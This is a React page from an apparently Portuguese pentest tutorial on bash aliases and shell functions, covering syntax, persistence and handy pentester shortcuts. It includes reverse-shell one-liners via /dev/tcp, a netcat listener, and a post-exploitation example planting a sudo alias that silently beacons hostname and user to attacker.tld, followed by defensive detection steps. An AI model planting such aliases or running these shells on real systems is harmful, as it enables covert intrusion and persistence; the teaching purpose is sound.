import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Aliases() {
  return (
    <PageContainer
      title="Aliases e funções shell"
      subtitle="Atalhos para comandos longos, funções com argumentos e como atacantes abusam disso para persistência."
      difficulty="iniciante"
      timeToRead="12 min"
    >
      <h2>O que é um alias</h2>
      <p>
        Um <strong>alias</strong> é uma substituição textual: o shell troca o nome do alias
        pela expansão antes de executar. É a forma mais simples de criar atalhos pessoais
        para comandos que você digita o tempo todo.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "alias ll='ls -lah --color=auto'",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "ll /tmp",
            out: `total 24K
drwxrwxrwt  6 root     root     180 abr  3 15:42 .
drwxr-xr-x 19 root     root    4.0K mar  1 09:11 ..
-rw-r--r--  1 wallyson wallyson  17 abr  3 15:42 nota.txt`,
            outType: "info",
          },
          {
            comment: "lista todos os aliases ativos",
            cmd: "alias | head -8",
            out: `alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -lah --color=auto'
alias ls='ls --color=auto'`,
            outType: "default",
          },
          {
            comment: "remover um alias",
            cmd: "unalias ll",
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <h2>Sintaxe e regras importantes</h2>
      <CodeBlock
        language="bash"
        title="o bom, o ruim e o feio do alias"
        code={`# 1. SEM espaço em volta do = (senão vira comando!)
alias gs='git status'        # ✓
alias gs = 'git status'      # ✗ erro

# 2. Aspas simples não interpolam — preserva $var literalmente
alias whoami_at='echo $USER@$HOSTNAME'   # expande na HORA do uso
alias whoami_at="echo $USER@$HOSTNAME"   # expande NO MOMENTO da definição

# 3. Aliases NÃO aceitam argumentos no meio.
#    Para isso, use FUNÇÃO. Veja seção abaixo.

# 4. Aliases só são expandidos no INÍCIO de um comando (por padrão).
alias ll='ls -lah'
sudo ll                       # ✗ não expande dentro de sudo
alias sudo='sudo '            # ✓ truque: espaço final faz expandir o próximo

# 5. Para aliases também rodarem em scripts não-interativos:
shopt -s expand_aliases       # do contrário, scripts ignoram aliases`}
      />

      <h2>Persistir aliases</h2>
      <p>
        Aliases definidos com <code>alias foo=...</code> só vivem durante a sessão. Para
        torná-los permanentes coloque em <code>~/.bashrc</code> (ou
        <code> ~/.bash_aliases</code>, que o <code>~/.bashrc</code> padrão do Debian/Kali já
        importa).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "grep -n bash_aliases ~/.bashrc",
            out: `116:if [ -f ~/.bash_aliases ]; then
117:    . ~/.bash_aliases
118:fi`,
            outType: "info",
          },
          {
            cmd: "cat > ~/.bash_aliases <<'EOF'\n# Pentest aliases\nalias ports='ss -tulnp'\nalias myip='curl -s ifconfig.me; echo'\nalias localip=\"hostname -I | awk '{print \\$1}'\"\nalias web='python3 -m http.server 80'\nalias hist='history | tail -50'\nalias gh='cd ~/tools && ls'\nEOF",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "source ~/.bashrc && alias | grep -E 'web|ports|myip'",
            out: `alias myip='curl -s ifconfig.me; echo'
alias ports='ss -tulnp'
alias web='python3 -m http.server 80'`,
            outType: "success",
          },
        ]}
      />

      <h2>Top 20 aliases para pentester</h2>
      <CodeBlock
        language="bash"
        title="~/.bash_aliases — versão completa pentester"
        code={`# ===== navegação =====
alias ..='cd ..'
alias ...='cd ../..'
alias ll='ls -lah --color=auto'
alias la='ls -A'
alias l='ls -CF'
alias h='history | tail -30'

# ===== infos do sistema =====
alias myip='curl -s ifconfig.me; echo'
alias localip="hostname -I | awk '{print \\$1}'"
alias ports='ss -tulnp'
alias listening='ss -tlnp'
alias mem='free -h'
alias diskhog='du -sh * | sort -h'

# ===== rede e enumeração =====
alias nmapquick='sudo nmap -T4 -F'
alias nmapfull='sudo nmap -p- -sV -sC -T4'
alias web='python3 -m http.server 80'
alias web8='python3 -m http.server 8080'
alias smb='impacket-smbserver SHARE \$(pwd) -smb2support'

# ===== cracking / wordlists =====
alias rockyou='/usr/share/wordlists/rockyou.txt'
alias seclists='cd /usr/share/seclists'

# ===== msf / shells =====
alias msf='msfconsole -q'
alias rev='echo \"bash -i >& /dev/tcp/\$(localip)/4444 0>&1 | base64\"'
alias listen='nc -lvnp 4444'

# ===== git =====
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph -20'

# ===== quality of life =====
alias please='sudo \$(fc -ln -1)'
alias copy='xclip -selection clipboard'
alias paste='xclip -selection clipboard -o'`}
      />

      <h2>Funções shell — quando alias não dá conta</h2>
      <p>
        Funções aceitam argumentos, têm múltiplas linhas e podem ter lógica. Use sempre
        que precisar de algo mais que substituição literal.
      </p>

      <CodeBlock
        language="bash"
        title="funções pentest mais usadas"
        code={`# Saber quem responde dentro da /24 (host discovery rápido)
sweep() {
  local net="\${1:-192.168.1}"
  for i in {1..254}; do
    (ping -c1 -W1 "\$net.\$i" &>/dev/null && echo "[+] \$net.\$i UP") &
  done
  wait
}
# uso:  sweep 10.10.10

# Extrair só URLs únicas de um arquivo (Burp logs, JS dumps, etc.)
urls() {
  grep -Eoi 'https?://[^"'"'"' <>]+' "\$1" | sort -u
}

# Decodificar base64 de stdin sem ter que digitar 'echo "..." | base64 -d'
b64d() { base64 -d <<< "\$1"; echo; }
b64e() { echo -n "\$1" | base64; echo; }

# Reverse shell oneliner pronto, com seu IP atual
revshell() {
  local ip=\$(hostname -I | awk '{print \$1}')
  local port=\${1:-4444}
  echo "bash -i >& /dev/tcp/\$ip/\$port 0>&1"
  echo "Listener: nc -lvnp \$port"
}

# mkdir + cd no mesmo movimento
mkcd() { mkdir -p "\$1" && cd "\$1"; }

# extrai praticamente qualquer compactado
extract() {
  case "\$1" in
    *.tar.bz2)  tar xjf "\$1"  ;;
    *.tar.gz)   tar xzf "\$1"  ;;
    *.tar.xz)   tar xJf "\$1"  ;;
    *.bz2)      bunzip2 "\$1"  ;;
    *.gz)       gunzip "\$1"   ;;
    *.zip)      unzip "\$1"    ;;
    *.7z)       7z x "\$1"     ;;
    *.rar)      unrar x "\$1"  ;;
    *) echo "extract: formato não suportado: \$1" ;;
  esac
}`}
      />

      <h2>Investigando o que um nome é</h2>
      <CommandTable
        title="type, command, builtin"
        variations={[
          { cmd: "type ls", desc: "Diz o que 'ls' É: alias, função, builtin, hash ou arquivo.", output: "ls é um alias para 'ls --color=auto'" },
          { cmd: "type -a ls", desc: "Mostra TODAS as resoluções (alias + arquivo + ...).", output: "ls é um alias para 'ls --color=auto'\nls é /usr/bin/ls\nls é /bin/ls" },
          { cmd: "type -t ls", desc: "Só o tipo (alias|builtin|file|function|keyword).", output: "alias" },
          { cmd: "command ls", desc: "Executa 'ls' IGNORANDO aliases e funções.", output: "Volta ao comportamento padrão." },
          { cmd: "builtin cd /tmp", desc: "Força o uso do builtin (não de uma função 'cd' que você definiu).", output: "Útil para evitar loops em funções." },
          { cmd: "\\ls", desc: "Backslash desliga o alias só uma vez.", output: "= command ls, mas mais curto." },
          { cmd: "which ls", desc: "Só procura no PATH (ignora aliases/funções).", output: "/usr/bin/ls" },
          { cmd: "declare -f sweep", desc: "Mostra o corpo de uma função.", output: "sweep ()\n{\n    local net=\"\${1:-192.168.1}\";\n    ...\n}" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "type ll urls cd nonexistent",
            out: `ll é um alias para 'ls -lah --color=auto'
urls é uma função
urls ()
{
    grep -Eoi 'https?://[^"\\'\\' <>]+' "\$1" | sort -u
}
cd é um builtin do shell
bash: type: nonexistent: não encontrado`,
            outType: "info",
          },
        ]}
      />

      <h2>Aliases como vetor de persistência (red team)</h2>
      <p>
        Um truque clássico de pós-exploração é plantar um alias malicioso no
        <code> ~/.bashrc</code> da vítima. Quando ela executar o comando esperado, sua
        carga roda primeiro. É <em>persistence</em> sem cron, sem systemd, sem nada que
        EDR genérico monitore.
      </p>

      <CodeBlock
        language="bash"
        title="exemplo educacional — plantar callback em sudo"
        code={`# Imagine que você comprometeu o user 'devops' que usa sudo várias vezes ao dia.
# Você adiciona ao .bashrc DELE:

cat >> /home/devops/.bashrc <<'EOF'

# parece config inocente
alias sudo='/tmp/.cache/x; sudo'
EOF

# E em /tmp/.cache/x:
cat > /tmp/.cache/x <<'EOF'
#!/bin/bash
curl -s http://attacker.tld/beacon?h=\$(hostname)\\&u=\$(whoami) >/dev/null 2>&1
EOF
chmod +x /tmp/.cache/x

# Toda vez que o devops digitar 'sudo algo', o beacon dispara e DEPOIS o sudo
# real continua, sem nenhum sinal visível.`}
      />

      <AlertBox type="danger" title="Em pentest legal, sempre limpe">
        Esse padrão deve aparecer no relatório com instruções claras de remoção (linhas
        adicionadas, arquivos plantados). Em engagement real, NUNCA esqueça de remover —
        é a diferença entre red team profissional e crime.
      </AlertBox>

      <h2>Checagem defensiva: detectar aliases maliciosos</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "audit completo dos arquivos shell do usuário",
            cmd: "grep -nE '^(alias|function)' ~/.bashrc ~/.bash_aliases ~/.zshrc 2>/dev/null",
            out: `/home/devops/.bashrc:140:alias sudo='/tmp/.cache/x; sudo'
/home/devops/.bashrc:142:alias ls='ls --color=auto'`,
            outType: "warning",
          },
          {
            comment: "diff contra um baseline limpo (de outro host idêntico)",
            cmd: "diff /baseline/.bashrc ~/.bashrc",
            out: `139a140
> alias sudo='/tmp/.cache/x; sudo'`,
            outType: "error",
          },
        ]}
      />

      <PracticeBox
        title="Crie 5 aliases pentest e uma função 'mkcd'"
        goal="Construir um ~/.bash_aliases pessoal já útil pro dia a dia."
        steps={[
          "Crie ~/.bash_aliases com 5 aliases (myip, ports, web, ll, listen).",
          "Adicione a função mkcd no final.",
          "Source no .bashrc atual.",
          "Teste 'mkcd /tmp/teste123' — deve criar e entrar no diretório.",
        ]}
        command={`cat > ~/.bash_aliases <<'EOF'
alias myip='curl -s ifconfig.me; echo'
alias ports='ss -tulnp'
alias web='python3 -m http.server 80'
alias ll='ls -lah --color=auto'
alias listen='nc -lvnp 4444'

mkcd() { mkdir -p "\$1" && cd "\$1"; }
EOF
source ~/.bashrc
mkcd /tmp/teste123
pwd
type myip`}
        expected={`/tmp/teste123
myip é um alias para 'curl -s ifconfig.me; echo'`}
        verify="O pwd retorna /tmp/teste123 (provando que mkcd entrou no dir) e type confirma que o alias está ativo."
      />

      <AlertBox type="info" title="Zsh (default em Kali Purple) é compatível">
        Toda a sintaxe acima funciona igual em Zsh. O equivalente do <code>~/.bashrc</code>
        é o <code>~/.zshrc</code>, e em vez de <code>shopt -s expand_aliases</code> use
        <code> setopt aliases</code>.
      </AlertBox>
    </PageContainer>
  );
}
